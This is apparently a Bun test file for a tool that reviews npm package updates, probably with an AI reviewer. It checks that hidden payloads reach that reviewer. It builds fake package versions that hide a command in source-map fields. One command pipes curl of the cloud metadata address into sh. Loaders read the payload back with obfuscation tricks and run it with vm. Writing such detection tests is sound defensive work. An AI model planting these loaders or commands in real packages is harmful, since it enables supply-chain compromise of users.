import { test, expect } from "bun:test";
import { reviewUpdate } from "../src/review.ts";
import type { FileMap } from "../src/prepass.ts";
const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const META = "require('child_process').exec('curl http://169.254.169.254/latest/meta-data/ | sh')";
const SPAWN = "require('child_process').exec(process.env.Q)"; // only process-spawn matches
type W = "names" | "sourcesContent" | "namesRev" | "none";
const map = (seed: string, big: boolean, pay: string | null, where: W) => {
  const names = where === "names" && pay ? [pay.slice(0, 20), pay.slice(20)] : where === "namesRev" && pay ? [pay.slice(20), pay.slice(0, 20)] : [];
  return JSON.stringify({ version: 3, file: "index.js", sources: ["../src/index.ts"], names, sourcesContent: [where === "sourcesContent" && pay ? pay : "ok"], mappings: ("AAAA" + seed + "CAAO,aAAP,OAAO,uBAAP;").repeat(big ? 250_000 : 20) });
};
const LD = (name: string, src = "m.sourcesContent[0]") => `const m = JSON.parse(require('fs').readFileSync(${name}, 'utf8'));\nrequire('vm').runInThisContext(${src});\nexports.v = 2;\n`;
const SC = 'm["sources"+"Content"][0]';
const cases: [string, string, string | null, W, boolean][] = [
  ["1 names META + loader .map", LD("__filename + '.map'", "m.names.join('')"), META, "names", true],
  ["2 names META no loader", "exports.v = 2;\n", META, "names", true],
  ["3 sc META + loader .map", LD("__filename + '.map'", SC), META, "sourcesContent", true],
  ["4 sc META no loader", "exports.v = 2;\n", META, "sourcesContent", true],
  ["5 sc SPAWN + loader .map", LD("__filename + '.map'", SC), SPAWN, "sourcesContent", true],
  ["6 sc SPAWN no loader", "exports.v = 2;\n", SPAWN, "sourcesContent", true],
  ["7 sc SPAWN loader '.m'+'ap'", LD("__filename + '.m' + 'ap'", SC), SPAWN, "sourcesContent", true],
  ["8 sc SPAWN loader replace js.map", LD("__filename.replace(/js$/, 'js.map')", SC), SPAWN, "sourcesContent", true],
  ["9 sc SPAWN loader fromCharCode", LD("__filename + String.fromCharCode(46) + 'map'", SC), SPAWN, "sourcesContent", true],
  ["10 sc SPAWN loader readdir endsWith map", LD("require('path').join(__dirname, require('fs').readdirSync(__dirname).find((f) => f.endsWith('map')))", SC), SPAWN, "sourcesContent", true],
  ["11 namesRev SPAWN loader reverse", LD("__filename + '.map'", "m.names.reverse().join('')"), SPAWN, "namesRev", true],
  ["12 namesRev SPAWN loader reverse + '.m'+'ap'", LD("__filename + '.m' + 'ap'", "m.names.reverse().join('')"), SPAWN, "namesRev", true],
];
for (const [label, code, pay, where, want] of cases) test(label, async () => {
  const reviewed: string[] = [];
  const r = await reviewUpdate({
    eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
    cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), chunkChars: 60000,
    loadArtifacts: async () => ({
      old: files({ "package.json": '{"name":"lib","version":"a","main":"lib/index.js"}', "lib/index.js": "exports.v = 1;\n", "lib/index.js.map": map("a", true, null, where) }),
      new: files({ "package.json": '{"name":"lib","version":"b","main":"lib/index.js"}', "lib/index.js": code, "lib/index.js.map": map("b", true, pay, where) }),
    }),
  });
  // Payload in front of the reviewer: a strings-only hit shows the strings and keeps the mappings a hash line, so the mappings text itself is not the test.
  const all = reviewed.join("");
  const shown = all.includes(pay!.slice(0, 20)) || all.includes(pay!.slice(20));
  expect({ label, payloadShown: shown }).toEqual({ label, payloadShown: want });
}, 60000);
